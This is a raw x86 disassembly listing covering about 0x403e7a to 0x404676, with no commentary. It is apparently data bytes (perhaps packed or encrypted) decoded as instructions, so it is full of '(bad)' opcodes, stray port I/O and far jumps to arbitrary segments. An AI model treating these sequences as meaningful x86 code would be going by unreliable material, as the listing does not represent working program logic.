  403e7a:	outs   dx,BYTE PTR ds:[esi]
  403e7b:	div    BYTE PTR [esi+0x44872305]
  403e81:	aad    0x8f
  403e83:	(bad)  
  403e84:	fisttp DWORD PTR [edi+edi*4]
  403e87:	sahf   
  403e88:	(bad)  
  403e8a:	test   BYTE PTR [ebp+0x35e7ae8c],al
  403e90:	pop    ds
  403e91:	mov    ebp,0xdba4bc70
  403e96:	mov    ecx,0x2f5b5f2c
  403e9b:	or     esp,DWORD PTR [edx+0x11cf8c2d]
  403ea1:	mov    edi,0x688fdc68
  403ea6:	cld    
  403ea7:	and    eax,0x3aa83aea
  403eac:	fist   DWORD PTR ds:0x9b2ba45f
  403eb2:	xchg   ecx,eax
  403eb3:	pop    eax
  403eb4:	push   ds
  403eb5:	pop    esi
  403eb6:	mov    edx,0xf5fc5101
  403ebb:	mov    bh,0x79
  403ebd:	sbb    al,0x15
  403ebf:	arpl   WORD PTR [eax-0x2d],cx
  403ec2:	scas   al,BYTE PTR es:[edi]
  403ec3:	sbb    bh,bh
  403ec5:	test   DWORD PTR [edx+eiz*8-0x1b3e6af7],0xc505a5f9
  403ed0:	pop    edi
  403ed1:	dec    ebx
  403ed2:	repnz mov esi,0x1b635db4
  403ed8:	inc    ebx
  403ed9:	in     al,dx
  403eda:	fbstp  TBYTE PTR ss:[esi+0x4d6b288f]
  403ee1:	xchg   ecx,eax
  403ee2:	out    dx,eax
  403ee3:	sbb    eax,0x5cf62b91
  403ee8:	mov    cl,BYTE PTR [ebp+0x72efc21b]
  403eee:	fistp  DWORD PTR [ecx+0x43fe282a]
  403ef4:	sbb    cl,0x7d
  403ef7:	inc    edx
  403ef8:	fadd   QWORD PTR [ebp-0x49]
  403efb:	dec    ebx
  403efc:	jae    0x403f44
  403efe:	pop    esp
  403eff:	rcl    DWORD PTR [eax],cl
  403f01:	and    bl,dl
  403f03:	pop    ss
  403f04:	dec    ebp
  403f05:	loop   0x403f7e
  403f07:	test   DWORD PTR [edx],ecx
  403f09:	xchg   BYTE PTR [ebp-0x3076dca6],bh
  403f0f:	pop    edi
  403f10:	ja     0x403e9a
  403f12:	xor    esp,esp
  403f14:	push   edi
  403f15:	mov    cl,0xe2
  403f17:	out    dx,eax
  403f18:	fild   DWORD PTR [eax-0x50]
  403f1b:	xchg   ecx,eax
  403f1c:	gs iret 
  403f1e:	cmp    DWORD PTR [ebp-0x14],0x5ca77a86
  403f25:	cmc    
  403f26:	pop    ds
  403f27:	mov    bh,0xf
  403f29:	mov    ah,0xb7
  403f2b:	rcr    dl,0x81
  403f2e:	mov    edi,0x1769e94a
  403f33:	fisubr DWORD PTR [ecx-0x2b]
  403f36:	sbb    al,0x16
  403f38:	sbb    DWORD PTR [ebx-0x4b],ecx
  403f3b:	data16 adc al,0xe2
  403f3e:	neg    DWORD PTR [edi-0x3d1f8937]
  403f44:	xchg   DWORD PTR [edx+0x63],esp
  403f47:	sub    BYTE PTR [eax+eax*1+0x51],ah
  403f4b:	mov    bl,0xb4
  403f4d:	mov    ch,0xa3
  403f4f:	ret    0x444a
  403f52:	adc    eax,0xc21a453c
  403f57:	dec    edx
  403f58:	adc    BYTE PTR [ebx],bl
  403f5a:	in     al,0xba
  403f5c:	jne    0x403f16
  403f5e:	inc    edx
  403f5f:	adc    eax,0x87993586
  403f64:	out    0xe2,eax
  403f66:	lods   eax,DWORD PTR ds:[esi]
  403f67:	adc    DWORD PTR [esp+esi*1+0x16],ecx
  403f6b:	and    eax,0x9f50140b
  403f70:	sbb    dl,ch
  403f72:	call   0x63ca:0x8a00597c
  403f79:	xor    al,0x6c
  403f7b:	jmp    0x403f36
  403f7d:	cwde   
  403f7e:	pop    ss
  403f7f:	ret    
  403f80:	jl     0x403fe3
  403f82:	fdivr  QWORD PTR [eax]
  403f84:	popf   
  403f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f86:	or     BYTE PTR [ebp-0x48c25aa7],ch
  403f8c:	ins    DWORD PTR es:[edi],dx
  403f8d:	mov    bh,0xf1
  403f8f:	rcl    BYTE PTR [esi-0x16],0x66
  403f93:	mov    al,0xa8
  403f95:	mov    ebx,0xcc7865d5
  403f9a:	push   ecx
  403f9b:	ret    0x6350
  403f9e:	xlat   BYTE PTR ds:[ebx]
  403f9f:	clc    
  403fa0:	mov    ch,0x7c
  403fa2:	test   al,0x4b
  403fa4:	or     bh,cl
  403fa6:	add    DWORD PTR [edx-0x23],ebx
  403fa9:	push   esi
  403faa:	and    al,0x73
  403fac:	dec    ebx
  403fad:	cmc    
  403fae:	sbb    eax,0xc004e224
  403fb3:	popa   
  403fb4:	rcl    ah,1
  403fb6:	popa   
  403fb7:	push   esp
  403fb8:	test   BYTE PTR [edx+0x39],al
  403fbb:	(bad)  
  403fbc:	repz cmp bh,BYTE PTR [ebx]
  403fbf:	scas   eax,DWORD PTR es:[edi]
  403fc0:	gs test al,0xf2
  403fc3:	xor    ah,BYTE PTR [ecx-0x7a374966]
  403fc9:	loope  0x403f74
  403fcb:	dec    esi
  403fcc:	imul   edx
  403fce:	inc    esp
  403fcf:	into   
  403fd0:	jmp    0x4b88:0xe2e38daa
  403fd7:	ja     0x40402c
  403fd9:	pop    ebx
  403fda:	rcr    BYTE PTR [ebx+0x4cafb200],0x63
  403fe1:	xchg   BYTE PTR [ebx-0x3a17054a],ah
  403fe7:	push   cs
  403fe8:	push   edi
  403fe9:	or     BYTE PTR [eax],dh
  403feb:	jnp    0x404006
  403fed:	mov    esi,0xe902ad3a
  403ff2:	test   esp,ecx
  403ff4:	sbb    eax,0xeaef1a4b
  403ff9:	data16 scas al,BYTE PTR es:[edi]
  403ffb:	mov    dl,0xad
  403ffd:	inc    edx
  403ffe:	icebp  
  403fff:	mov    ch,0x40
  404001:	push   edx
  404002:	retf   
  404003:	iret   
  404004:	sub    bh,BYTE PTR [edi+0x6de93c07]
  40400a:	xchg   esp,edx
  40400c:	pushf  
  40400d:	pop    ecx
  40400e:	cmp    dh,BYTE PTR [ecx+0x5]
  404011:	sub    cl,dh
  404013:	scas   eax,DWORD PTR es:[edi]
  404014:	out    0xb5,al
  404016:	(bad)  
  404018:	call   0xe8672ad6
  40401d:	ficomp DWORD PTR [esi-0x5e]
  404020:	shr    BYTE PTR [ecx-0x3a],cl
  404023:	jbe    0x40405e
  404025:	(bad)  
  404027:	xchg   esp,eax
  404028:	aas    
  404029:	jo     0x403fee
  40402b:	les    ebp,FWORD PTR [edi+0x4294f4a0]
  404031:	stc    
  404032:	push   es
  404033:	adc    BYTE PTR [ebp+0xdab5009],dl
  404039:	xor    al,0x8b
  40403b:	std    
  40403c:	fwait
  40403d:	sub    eax,0xacf97b20
  404042:	push   cs
  404043:	sub    BYTE PTR [edi],0xdd
  404046:	xchg   DWORD PTR [esi],ebx
  404048:	sar    DWORD PTR [edx-0x5b12039e],0xcd
  40404f:	mov    eax,ds:0xaf451e1
  404054:	pop    ss
  404055:	sbb    BYTE PTR [ecx-0x70c6a16c],bl
  40405b:	and    al,0x85
  40405d:	push   ebx
  40405e:	mov    dh,0x6b
  404060:	mov    fs,ebp
  404062:	push   ss
  404063:	mov    BYTE PTR [ecx+0x3038329d],0xc0
  40406a:	and    DWORD PTR [eax-0x6368610b],0x13
  404071:	sbb    DWORD PTR [ebx+0x2f],eax
  404074:	mov    al,0x3d
  404076:	cld    
  404077:	or     esp,eax
  404079:	popa   
  40407a:	sbb    BYTE PTR [edx+0x4c],0xcd
  40407e:	dec    eax
  40407f:	aam    0x66
  404081:	inc    esp
  404082:	xor    ecx,DWORD PTR [ebx-0x1cc0469c]
  404088:	shl    DWORD PTR [eax-0x4e],cl
  40408b:	sbb    al,0x6d
  40408d:	retf   
  40408e:	pop    esp
  40408f:	adc    al,0x24
  404091:	adc    DWORD PTR [esi+ebx*4],0x33
  404095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404096:	cmp    al,0x44
  404098:	cmp    DWORD PTR [esp+ebx*8+0x37],eax
  40409c:	cli    
  40409d:	sub    dl,dl
  40409f:	(bad)  
  4040a0:	dec    esp
  4040a1:	lds    esp,FWORD PTR [edi-0x9bd329c]
  4040a7:	xlat   BYTE PTR ds:[ebx]
  4040a8:	lods   eax,DWORD PTR ds:[esi]
  4040a9:	cmp    edx,DWORD PTR [edi+0x70ff0866]
  4040af:	mov    esp,0x6173be91
  4040b4:	mov    DWORD PTR [edx],ebx
  4040b6:	xor    al,0x27
  4040b8:	imul   esp,edi,0x874f21a6
  4040be:	inc    ebp
  4040bf:	and    BYTE PTR [esi+0x73],cl
  4040c2:	fst    QWORD PTR [eax-0xc]
  4040c5:	mov    DWORD PTR [ebx+edi*1],edx
  4040c8:	das    
  4040c9:	dec    edx
  4040ca:	nop
  4040cb:	scas   al,BYTE PTR es:[edi]
  4040cc:	mul    dh
  4040ce:	icebp  
  4040cf:	fwait
  4040d0:	cdq    
  4040d1:	mul    DWORD PTR ds:[esi+ebx*8+0x522bc04a]
  4040d9:	mov    ebp,DWORD PTR ds:[edi-0x6]
  4040dd:	out    dx,al
  4040de:	pop    edx
  4040df:	xor    DWORD PTR [edx+0x1c],0xffffffc1
  4040e3:	jmp    0x40414d
  4040e5:	push   ecx
  4040e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040e7:	(bad)  
  4040e8:	addr16 pop esp
  4040ea:	or     bl,bh
  4040ec:	mov    ds:0x889b735b,al
  4040f1:	sub    esi,esp
  4040f3:	arpl   WORD PTR [ecx-0x62603a75],di
  4040f9:	or     BYTE PTR [esi],0x3b
  4040fc:	add    BYTE PTR [ebx-0x4],dl
  4040ff:	shr    BYTE PTR [eax+0x141d3a1e],cl
  404105:	addr16 jne 0x4040d2
  404108:	fimul  DWORD PTR [esi+ecx*8-0x7e]
  40410c:	sub    eax,0x7fa414c8
  404111:	js     0x4040a8
  404113:	pop    ecx
  404114:	mov    ah,0x3e
  404116:	mov    ch,0xdb
  404118:	cmp    BYTE PTR [edi-0x3ae86a8c],dh
  40411e:	int3   
  40411f:	and    eax,0x1c17808e
  404124:	add    ebx,DWORD PTR [esi+0x2c]
  404127:	inc    ebx
  404128:	das    
  404129:	push   ebp
  40412a:	(bad)  
  40412b:	pop    ds
  40412c:	aas    
  40412d:	arpl   WORD PTR [edx+0x4b675b62],bp
  404133:	hlt    
  404134:	jle    0x4040f2
  404136:	inc    ebp
  404137:	xchg   ecx,eax
  404138:	mov    ecx,0x395ba6f4
  40413d:	dec    ecx
  40413e:	mov    cl,0x73
  404140:	cdq    
  404141:	inc    eax
  404142:	inc    esp
  404143:	sbb    esp,DWORD PTR [edx+0x514a9f76]
  404149:	jo     0x40416a
  40414b:	out    0xfe,eax
  40414d:	fmul   st,st(1)
  40414f:	sbb    DWORD PTR [edx-0x14],eax
  404152:	js     0x4041b0
  404154:	lods   al,BYTE PTR ds:[esi]
  404155:	mov    eax,0xa2ae36fb
  40415a:	mov    edx,0x252a65d1
  40415f:	xchg   ecx,eax
  404160:	dec    ecx
  404161:	aas    
  404162:	bound  edi,QWORD PTR [edi-0x79]
  404165:	xlat   BYTE PTR ds:[ebx]
  404166:	out    0xef,eax
  404168:	sbb    bl,0xfb
  40416b:	sar    edx,0xd0
  40416e:	mov    dh,0x7
  404170:	in     eax,dx
  404171:	arpl   WORD PTR [edx-0x3c],di
  404174:	mov    al,0x69
  404176:	nop
  404177:	test   al,0xa9
  404179:	xchg   DWORD PTR [ebx-0x63607d78],eax
  40417f:	push   esp
  404180:	and    dh,BYTE PTR [edi-0x8]
  404183:	test   DWORD PTR [edi],ebp
  404185:	push   edx
  404186:	in     al,0x3
  404188:	push   cs
  404189:	mov    ch,0xf8
  40418b:	push   es
  40418c:	inc    edx
  40418d:	(bad)  
  40418e:	jle    0x404177
  404190:	or     DWORD PTR [esp+ebp*8+0x6a2c2fc0],esi
  404197:	and    esi,DWORD PTR [ebx]
  404199:	inc    esi
  40419a:	add    edx,ebx
  40419c:	adc    edi,ebx
  40419e:	ins    DWORD PTR es:[edi],dx
  40419f:	pop    esi
  4041a0:	add    DWORD PTR [eax-0x1e],0x572b91a5
  4041a7:	jbe    0x4041af
  4041a9:	push   esi
  4041aa:	mov    ds:0xf1252136,eax
  4041af:	adc    BYTE PTR [ebp+0x3680c346],cl
  4041b5:	addr16 aas 
  4041b7:	jp     0x404186
  4041b9:	or     BYTE PTR ds:0x229978d4,bh
  4041bf:	aaa    
  4041c0:	or     ebx,esi
  4041c2:	addr16 dec esp
  4041c4:	leave  
  4041c5:	iret   
  4041c6:	pop    edx
  4041c7:	mov    cl,0x1
  4041c9:	out    dx,al
  4041ca:	repnz in al,0xc4
  4041cd:	lea    eax,[ecx]
  4041cf:	cld    
  4041d0:	ficomp WORD PTR [ecx+esi*2-0x26]
  4041d4:	aad    0xfc
  4041d6:	repz jns 0x404222
  4041d9:	hlt    
  4041da:	mov    WORD PTR [edi+esi*1-0x2b],ss
  4041de:	inc    esi
  4041df:	test   DWORD PTR es:[ebx],edi
  4041e2:	test   edx,esi
  4041e4:	mov    edx,0x7568be02
  4041e9:	sahf   
  4041ea:	xor    esp,0xffffffa3
  4041ed:	out    0xb3,eax
  4041ef:	test   al,0x82
  4041f1:	xchg   ebx,eax
  4041f2:	(bad)  
  4041f3:	lahf   
  4041f4:	je     0x404226
  4041f6:	(bad)  [esi+0x505739fc]
  4041fc:	pop    esi
  4041fd:	xor    al,0x59
  4041ff:	push   ds
  404200:	arpl   WORD PTR [ecx],cx
  404202:	push   edx
  404203:	mov    al,ds:0x81c3a6a4
  404208:	inc    edx
  404209:	cs je  0x404200
  40420c:	cmp    BYTE PTR [edi],dl
  40420e:	mov    al,0x6d
  404210:	pop    edx
  404211:	mov    cs,WORD PTR [edi+0x38d6a9f2]
  404217:	xor    dh,bl
  404219:	mul    dl
  40421b:	fwait
  40421c:	push   ss
  40421d:	mov    ch,BYTE PTR [ebp-0x12]
  404220:	add    ecx,esi
  404222:	jecxz  0x4041ca
  404224:	in     al,dx
  404225:	xchg   ecx,eax
  404226:	dec    esi
  404227:	pand   mm6,QWORD PTR [edi+ebp*1]
  40422b:	dec    ebp
  40422c:	xor    eax,0xfd90b72a
  404231:	leave  
  404232:	loop   0x4041bd
  404234:	push   esp
  404235:	inc    esp
  404236:	imul   ecx,edx,0x58
  404239:	mov    ch,0x77
  40423b:	dec    esi
  40423c:	or     BYTE PTR [ecx-0x34696527],dl
  404242:	arpl   WORD PTR ds:0x27000b02,ax
  404248:	add    al,0xf2
  40424a:	xchg   edi,eax
  40424b:	jl     0x4042ae
  40424d:	jle    0x404296
  40424f:	aas    
  404250:	dec    edi
  404251:	jbe    0x40427b
  404253:	and    dh,BYTE PTR [esi+0x2f]
  404256:	push   ebx
  404257:	mov    al,ds:0x52b169df
  40425c:	(bad)  
  40425d:	ficomp WORD PTR [bx+si-0x39]
  404261:	xchg   esi,eax
  404262:	jne    0x404294
  404264:	loopne 0x404286
  404266:	xor    ch,BYTE PTR [ecx-0xc]
  404269:	ja     0x404209
  40426b:	popa   
  40426c:	mov    WORD PTR [edx],cs
  40426e:	pop    ecx
  40426f:	js     0x404217
  404271:	jecxz  0x404254
  404273:	mov    dh,0x92
  404275:	out    0xeb,eax
  404277:	fmul   QWORD PTR [ebx+0x62]
  40427a:	cmp    eax,0x7474e80b
  40427f:	push   eax
  404280:	pop    DWORD PTR [esp+ebx*8+0x70d0ac65]
  404287:	rcl    BYTE PTR [ebp+0x47],1
  40428a:	jmp    0x9f8cbe73
  40428f:	adc    al,0xee
  404291:	add    esi,DWORD PTR [ebx+0x636abb10]
  404297:	nop
  404298:	xor    edx,DWORD PTR [ecx]
  40429a:	iret   
  40429b:	lahf   
  40429c:	pop    edx
  40429d:	xchg   ebx,eax
  40429e:	sub    ch,al
  4042a0:	push   edx
  4042a1:	pop    ds
  4042a2:	pop    ecx
  4042a3:	sbb    eax,0xdcea459b
  4042a8:	xchg   BYTE PTR ds:0x854a9cf0,dl
  4042ae:	fistp  WORD PTR [edi+eax*2+0x6a000eb]
  4042b5:	push   ss
  4042b6:	jmp    0xfdbaecf8
  4042bb:	bound  ebx,QWORD PTR [ecx]
  4042bd:	push   eax
  4042be:	int    0xed
  4042c0:	push   edi
  4042c1:	inc    esi
  4042c2:	inc    eax
  4042c3:	test   DWORD PTR [edx],esi
  4042c5:	mov    al,ds:0x4a248902
  4042ca:	add    ecx,DWORD PTR ds:0x304b28a5
  4042d0:	push   0x87b767c9
  4042d5:	jl     0x404331
  4042d7:	hlt    
  4042d8:	pop    ebp
  4042d9:	cs inc esp
  4042db:	sbb    BYTE PTR [esi+0x6d],ah
  4042de:	das    
  4042df:	adc    dh,BYTE PTR [eax]
  4042e1:	stos   BYTE PTR es:[edi],al
  4042e2:	fstp   QWORD PTR [ecx]
  4042e4:	bound  esi,QWORD PTR [ebx+0x51]
  4042e7:	adc    eax,esi
  4042e9:	jae    0x404319
  4042eb:	push   0x6862a1a7
  4042f0:	ja     0x4042c5
  4042f2:	aaa    
  4042f3:	call   0xb0d7:0xc1751b19
  4042fa:	cmp    al,0xf2
  4042fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042fd:	sahf   
  4042fe:	js     0x404312
  404300:	jo     0x40436f
  404302:	(bad)  
  404303:	fimul  WORD PTR [eax]
  404305:	mov    cl,0x26
  404307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404308:	mov    edx,DWORD PTR [ecx]
  40430a:	lds    edi,FWORD PTR [ebx]
  40430c:	push   ss
  40430d:	push   eax
  40430e:	call   0xc963:0x561fef1d
  404315:	mov    bl,0x57
  404317:	cld    
  404318:	(bad)
  40431b:	call   0xa9a73ecb
  404320:	retf   0x431d
  404323:	in     eax,0xd5
  404325:	push   edx
  404326:	xor    BYTE PTR [ebx+eiz*2+0x4e862373],bh
  40432d:	xor    eax,edi
  40432f:	or     al,0xa2
  404331:	mov    esp,0x9e6b7601
  404336:	adc    DWORD PTR [esi+0x54],0x76
  40433a:	add    al,0x9
  40433c:	xor    al,0x2a
  40433e:	cli    
  40433f:	mov    eax,0x77ed1f
  404344:	or     al,BYTE PTR [eax]
  404346:	(bad)  
  404347:	ins    BYTE PTR es:[edi],dx
  404348:	stc    
  404349:	ins    DWORD PTR es:[edi],dx
  40434a:	inc    esi
  40434b:	bound  ebx,QWORD PTR ss:[edi-0x576467ff]
  404352:	xchg   esp,eax
  404353:	dec    esp
  404354:	mov    edx,0x44927cf5
  404359:	add    esi,edi
  40435b:	test   BYTE PTR [ecx+ebx*8+0x4f16518e],bl
  404362:	xor    esp,esp
  404364:	jl     0x404353
  404366:	int3   
  404367:	ss iret 
  404369:	push   ss
  40436a:	outs   dx,BYTE PTR ds:[esi]
  40436b:	out    dx,eax
  40436c:	xlat   BYTE PTR ds:[ebx]
  40436d:	adc    ecx,DWORD PTR ds:0x102f974f
  404373:	loopne 0x40430f
  404375:	inc    edi
  404376:	push   cs
  404377:	test   eax,0xf8033c75
  40437c:	pop    edx
  40437d:	add    eax,0xc514f88c
  404382:	pop    ss
  404383:	psubsw mm6,QWORD PTR [eax+0x5a586ff0]
  40438a:	xchg   esi,eax
  40438b:	ins    BYTE PTR es:[edi],dx
  40438c:	mov    ch,0x63
  40438e:	adc    bh,cl
  404390:	adc    BYTE PTR [esi],cl
  404392:	fadd   DWORD PTR [ebp+0x53]
  404395:	jle    0x404365
  404397:	cli    
  404398:	scas   eax,DWORD PTR es:[edi]
  404399:	dec    esi
  40439a:	add    eax,0x5d91a3fe
  4043a0:	or     dh,BYTE PTR [esi]
  4043a2:	jo     0x404372
  4043a4:	push   ebx
  4043a5:	not    ch
  4043a7:	pop    edx
  4043a8:	idiv   edi
  4043aa:	add    ecx,DWORD PTR [ebp-0x6d4ce90d]
  4043b0:	out    dx,al
  4043b1:	adc    eax,0x5c0cf8a4
  4043b6:	mov    ch,0xb7
  4043b8:	cwde   
  4043b9:	sub    DWORD PTR [edx-0x237bc49],ebx
  4043bf:	or     DWORD PTR [ecx],esi
  4043c1:	dec    eax
  4043c2:	call   0x2c8b:0x2dfda8df
  4043c9:	cmp    eax,0x358f703a
  4043ce:	add    DWORD PTR [ecx-0x4e],esp
  4043d1:	adc    edx,eax
  4043d3:	pop    esp
  4043d4:	jne    0x40439f
  4043d6:	push   0xffffffec
  4043d8:	rcl    DWORD PTR [edx-0x7760d410],1
  4043de:	sbb    al,BYTE PTR [eax-0x1e7c0492]
  4043e4:	test   al,0xa6
  4043e6:	iret   
  4043e7:	push   ecx
  4043e8:	inc    ebx
  4043e9:	(bad)  
  4043ea:	dec    esi
  4043eb:	stos   BYTE PTR es:[edi],al
  4043ec:	or     bl,BYTE PTR [eax]
  4043ee:	imul   ecx,edx,0xccf3afa8
  4043f4:	cmp    DWORD PTR [edx+0x58d055da],edx
  4043fa:	and    al,0x4b
  4043fc:	pop    ebx
  4043fd:	sub    dl,BYTE PTR [ebp+0x6057b834]
  404403:	int3   
  404404:	jnp    0x404394
  404406:	pop    esp
  404407:	clc    
  404408:	pop    edi
  404409:	das    
  40440a:	push   eax
  40440b:	dec    edx
  40440c:	(bad)  
  40440e:	daa    
  40440f:	cmp    al,0x4
  404411:	dec    edx
  404412:	adc    ah,BYTE PTR ds:0x790b30ac
  404418:	jp     0x4043ab
  40441a:	push   es
  40441b:	dec    edi
  40441c:	cmp    DWORD PTR [ebx-0x21],ecx
  40441f:	hlt    
  404420:	shr    DWORD PTR [ebx+0x3c0512e0],1
  404426:	and    edx,ebp
  404428:	cs icebp 
  40442a:	cmp    BYTE PTR [eax],al
  40442c:	jnp    0x404428
  40442e:	xlat   BYTE PTR ds:[ebx]
  40442f:	inc    ebx
  404430:	xor    DWORD PTR [eax+ebx*8+0x575ca7ab],edx
  404437:	(bad)
  40443a:	mov    ds:0x86628aba,eax
  40443f:	cmp    edx,DWORD PTR [edx]
  404441:	ror    DWORD PTR [edx],cl
  404443:	repnz leave 
  404445:	call   0x9776:0x4b63bf0
  40444c:	sub    cl,BYTE PTR [ebp-0x2e739b52]
  404452:	mov    edx,0xb0c1946c
  404457:	ss dec ebx
  404459:	pushf  
  40445a:	scas   al,BYTE PTR es:[edi]
  40445b:	retf   
  40445c:	push   cs
  40445d:	sbb    DWORD PTR [eax+0x73fd01b8],0x480f2afd
  404467:	or     bl,BYTE PTR [eax+0x23]
  40446a:	sub    DWORD PTR [eax+0x36],ebx
  40446d:	(bad)  
  40446e:	mov    edx,0x7299ad33
  404473:	(bad)  
  404474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404475:	loope  0x404452
  404477:	ficom  DWORD PTR [ecx-0x7673e02a]
  40447d:	xchg   BYTE PTR [edx],dl
  40447f:	dec    ecx
  404480:	pop    esp
  404481:	into   
  404482:	xor    eax,0x4079097a
  404487:	xor    edi,ebx
  404489:	pop    edx
  40448a:	mov    ecx,0xe8d71882
  40448f:	cmp    BYTE PTR [edi],ah
  404491:	pusha  
  404492:	dec    ebx
  404493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404494:	push   ecx
  404495:	or     eax,0xc33de423
  40449a:	(bad)
  40449d:	mov    ds:0x909b788d,al
  4044a2:	adc    eax,DWORD PTR [ecx-0x301591c2]
  4044a8:	xchg   edx,eax
  4044a9:	jecxz  0x404507
  4044ab:	add    DWORD PTR [eax],ebp
  4044ad:	js     0x4044f4
  4044af:	arpl   WORD PTR [ebx],di
  4044b1:	sbb    edx,edi
  4044b3:	sbb    eax,0xd2e4e395
  4044b8:	xor    eax,0xae9b183c
  4044bd:	fwait
  4044be:	or     al,0xbc
  4044c0:	pop    ecx
  4044c1:	adc    eax,0xe9936e0d
  4044c6:	arpl   WORD PTR [ebx],si
  4044c8:	les    edx,FWORD PTR [eax-0xf301fc6]
  4044ce:	jno    0x404537
  4044d0:	fld    TBYTE PTR [edi+edx*1+0x51b7aeae]
  4044d7:	adc    al,0x11
  4044d9:	pop    ss
  4044da:	cmp    al,0xe1
  4044dc:	mov    ch,0xca
  4044de:	or     BYTE PTR ds:[ebp-0x5a],0x82
  4044e3:	mov    edi,0x7a7ed1ce
  4044e8:	popf   
  4044e9:	push   ss
  4044ea:	mov    ds:0x790ba31a,eax
  4044ef:	push   esi
  4044f0:	push   ss
  4044f1:	and    bh,BYTE PTR [esi+0x66e2a78d]
  4044f7:	add    eax,0x6c331c06
  4044fc:	mov    DWORD PTR [esi],ebx
  4044fe:	sub    BYTE PTR [esp+edx*1],bh
  404501:	inc    esp
  404502:	sahf   
  404503:	mov    eax,0xa7810e65
  404508:	ret    0x487c
  40450b:	inc    edx
  40450c:	sbb    edi,edx
  40450e:	(bad)  
  40450f:	std    
  404510:	pusha  
  404511:	xchg   ebp,eax
  404512:	and    eax,0x9cfc0700
  404517:	fild   QWORD PTR [ebp-0x38c2d863]
  40451d:	inc    al
  40451f:	jbe    0x4044ac
  404521:	adc    DWORD PTR [edx+0x1c434e6],0xd17fde3f
  40452b:	ds popa 
  40452d:	pop    ss
  40452e:	or     dl,BYTE PTR [ebp+0x6d]
  404531:	xchg   esi,eax
  404532:	mov    cl,0x3e
  404534:	mov    dh,0xde
  404536:	dec    ebx
  404537:	sub    al,0x8c
  404539:	mov    eax,ds:0xdaca955c
  40453e:	and    BYTE PTR [eax-0x3b],ah
  404541:	push   DWORD PTR [ebx-0x13b92894]
  404547:	or     DWORD PTR [esi],esi
  404549:	pop    esp
  40454a:	mov    eax,0xb36f468c
  40454f:	xor    esi,DWORD PTR [esp+ecx*1-0x4d]
  404553:	mov    ss,WORD PTR [ebp+0x4a587dea]
  404559:	jg     0x404529
  40455b:	in     eax,dx
  40455c:	sub    bl,BYTE PTR [edi+0x31]
  40455f:	cli    
  404560:	cmp    dl,ah
  404562:	pop    es
  404563:	fmul   DWORD PTR [ecx-0x4c4f6280]
  404569:	fldenv [eax-0x205b0cd3]
  40456f:	inc    ecx
  404570:	sbb    DWORD PTR [ecx-0x313021f7],esi
  404576:	cmp    eax,edi
  404578:	mov    ah,BYTE PTR [edx+0x27ad342a]
  40457e:	pop    edx
  40457f:	inc    ebp
  404580:	dec    dx
  404582:	sbb    eax,0xba1b2b18
  404587:	neg    BYTE PTR [eax-0x50]
  40458a:	sub    ebp,DWORD PTR [edx+eiz*1-0x75]
  40458e:	pop    ds
  40458f:	ds push ebx
  404591:	cli    
  404592:	inc    edi
  404593:	ins    DWORD PTR es:[edi],dx
  404594:	in     al,0x36
  404596:	or     eax,0xb530f93d
  40459b:	cld    
  40459c:	pop    ebx
  40459d:	xor    DWORD PTR [esi-0x57],edi
  4045a0:	movups xmm0,XMMWORD PTR [edi+edi*8-0x5a]
  4045a5:	xchg   edx,eax
  4045a6:	sar    BYTE PTR [ebx+0x6],1
  4045a9:	gs stc 
  4045ab:	pop    edx
  4045ac:	lods   eax,DWORD PTR ds:[esi]
  4045ad:	sub    ah,cl
  4045af:	mov    eax,ds:0x643b91e9
  4045b5:	sbb    eax,0x52d888f6
  4045ba:	mov    esp,0x51f39e46
  4045bf:	mov    ebx,0xa21d236e
  4045c4:	call   0xa8c4:0x8016b3e
  4045cb:	hlt    
  4045cc:	in     eax,dx
  4045cd:	mov    DWORD PTR [ecx-0x715acaa4],eax
  4045d3:	aaa    
  4045d4:	daa    
  4045d5:	dec    eax
  4045d6:	fild   WORD PTR [eax+edx*1+0x1898d725]
  4045dd:	test   ah,al
  4045df:	push   esi
  4045e0:	add    eax,0xf5ec237e
  4045e5:	arpl   si,si
  4045e7:	xor    al,0xee
  4045e9:	repz dec edi
  4045eb:	test   DWORD PTR [edi],edx
  4045ed:	ret    
  4045ee:	sub    esi,DWORD PTR [ecx-0x518c9f22]
  4045f4:	stos   BYTE PTR es:[edi],al
  4045f5:	cwde   
  4045f6:	fwait
  4045f7:	push   esp
  4045f8:	jl     0x40466d
  4045fa:	adc    dh,al
  4045fc:	retf   
  4045fd:	ret    
  4045fe:	(bad)  
  4045ff:	fsubr  DWORD PTR [ebp+0x2b542461]
  404605:	scas   eax,DWORD PTR es:[edi]
  404606:	pushf  
  404607:	or     eax,0x5c767e84
  40460c:	pop    ss
  40460d:	cdq    
  40460e:	and    eax,0xaeb53873
  404613:	cmp    DWORD PTR [edx],ebx
  404615:	(bad)  
  404616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404617:	jg     0x404668
  404619:	nop
  40461a:	jg     0x4045b8
  40461c:	jmp    0x40465b
  40461e:	std    
  40461f:	in     al,0xea
  404621:	enter  0x39cc,0x2a
  404625:	jge    0x4045b6
  404627:	mov    bl,0x45
  404629:	jmp    0xed23:0x5586d967
  404630:	ror    BYTE PTR [edx],1
  404632:	xchg   edi,eax
  404633:	or     BYTE PTR [edx+0x22],bh
  404636:	lahf   
  404637:	push   ebp
  404638:	jle    0x40465d
  40463a:	ins    DWORD PTR es:[edi],dx
  40463b:	sub    dl,BYTE PTR [edi+0x26]
  40463e:	div    BYTE PTR [ebx-0x165a8f8]
  404644:	add    ch,BYTE PTR [ebp+0x59]
  404647:	js     0x4045f6
  404649:	dec    ebx
  40464a:	js     0x404608
  40464c:	jmp    0x4046b9
  40464e:	mov    eax,ds:0x89d80f19
  404653:	repz test eax,0x8db07eef
  404659:	dec    esi
  40465a:	fidivr DWORD PTR [esi]
  40465c:	ret    
  40465d:	push   ebx
  40465e:	dec    esp
  40465f:	add    eax,DWORD PTR [ebp-0x17]
  404662:	xor    esp,ecx
  404664:	test   bl,dh
  404666:	mov    al,ds:0xded58b9b
  40466b:	stos   DWORD PTR es:[edi],eax
  40466c:	(bad)  
  40466d:	fst    DWORD PTR [ebp-0x3]
  404670:	mov    cl,0x8f
  404672:	jg     0x4046ba
  404674:	pop    DWORD PTR [edi]
  404676:	(bad)  
